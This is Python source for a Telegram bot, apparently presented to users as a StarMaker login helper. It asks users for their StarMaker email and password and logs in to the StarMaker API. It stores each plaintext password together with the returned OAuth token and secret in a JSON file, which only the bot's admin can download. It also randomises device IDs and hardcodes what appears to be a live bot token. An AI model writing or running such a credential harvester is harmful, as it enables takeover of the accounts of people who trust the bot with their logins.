import json
import random
from server import keep_alive
import string
import requests
from telegram import Update, InputFile
from telegram.ext import (ApplicationBuilder, CommandHandler, MessageHandler,
                          ContextTypes, ConversationHandler, filters)

ADMIN_ID = 7723457282  # Replace with your Telegram ID
BOT_TOKEN = "7799315505:AAFx_Du0DqmH-jV7MDggKrmAu89ld_FBPiU"
DATA_FILE = "data.json"


# === Modify Device ID ===
# === Modify Device ID ===
def modify_device_id(device_id):
    if device_id != "N/A" and len(device_id) > 3:
        return device_id[:-3] + ''.join(
            random.choices(string.ascii_letters + string.digits, k=3))
    # Generate a fresh random device_id if original is missing or invalid
    return ''.join(random.choices(string.ascii_lowercase + string.digits,
                                  k=16))


# === Login to StarMaker ===
def login_to_starmaker(email, password):
    url = "https://api.starmakerstudios.com/web/login"
    headers = {
        "sec-ch-ua-platform": "Android",
        "user-agent": "Mozilla/5.0",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.starmakerstudios.com",
        "referer": "https://www.starmakerstudios.com/",
    }
    data = {
        "x_auth_mode": "email_login",
        "x_auth_email": email,
        "x_auth_password": password,
    }
    try:
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            response_data = response.json()
            user_data = response_data.get("user", {})
            return {
                "email":
                email,
                "pass":
                password,
                "id":
                response_data.get("id", "N/A"),
                "oauth_token":
                response_data.get("oauth_token", "N/A"),
                "oauth_token_secret":
                response_data.get("oauth_token_secret", "N/A"),
                "user_name":
                user_data.get("user_name", "N/A"),
                "sid":
                user_data.get("sid", 0),
                "device_id":
                modify_device_id(user_data.get("device_id", "N/A")),
                "gold":
                0
            }
    except:
        return None
    return None


# === Save entry to file ===
def save_to_file(entry):
    try:
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except:
            data = []
        data.append(entry)
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print("Error saving:", e)


# === States ===
EMAIL, PASSWORD = range(2)


# === /start ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to StarMaker Bot!\nUse /login to login\nAdmin-only: /announce, /download"
    )


# === /login ===
async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Please enter your email:")
    return EMAIL


async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["email"] = update.message.text
    await update.message.reply_text("Now enter your password:")
    return PASSWORD


async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = context.user_data["email"]
    password = update.message.text
    await update.message.reply_text("🔄 Logging in...")

    result = login_to_starmaker(email, password)
    if result:
        save_to_file(result)
        await update.message.reply_text(
            f"✅ *Login Successful & Saved!*\n\n"
            f"👤 *Username*: `{result['user_name']}`\n"
            f"📧 *Email*: `{result['email']}`\n"
            f"🆔 *User ID*: `{result['id']}`\n"
            f"🔐 *SID*: `{result['sid']}`\n"
            f"📲 *Device ID*: `{result['device_id']}`\n"
            f"🔑 *OAuth Token*: `{result['oauth_token']}`\n"
            f"🔒 *OAuth Secret*: `{result['oauth_token_secret']}`\n"
            f"💰 *Gold*: `{result['gold']}`",
            parse_mode="Markdown")
    else:
        await update.message.reply_text(
            "❌ Login failed or invalid credentials.")

    # Prompt again for next email
    await update.message.reply_text(
        "📧 Enter next email or send /cancel to stop:")
    return EMAIL


# === /download ===
async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Not allowed.")
        return
    try:
        with open(DATA_FILE, "rb") as f:
            await update.message.reply_document(
                InputFile(f, filename="data.json"))
    except:
        await update.message.reply_text("❌ No data found.")


# === /announce ===
async def announce(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Not allowed.")
        return
    msg = ' '.join(context.args)
    if msg:
        await update.message.reply_text(f"📢 Announcement:\n{msg}")
    else:
        await update.message.reply_text("❗ Use: /announce Your message")


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Login session cancelled.")
    return ConversationHandler.END


# === Setup ===
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("login", login)],
        states={
            EMAIL:
            [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
            PASSWORD:
            [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("announce", announce))
    app.add_handler(CommandHandler("download", download))
    app.add_handler(conv_handler)

    print("✅ Bot is running...")
    keep_alive()
    app.run_polling()


if __name__ == "__main__":
    main()
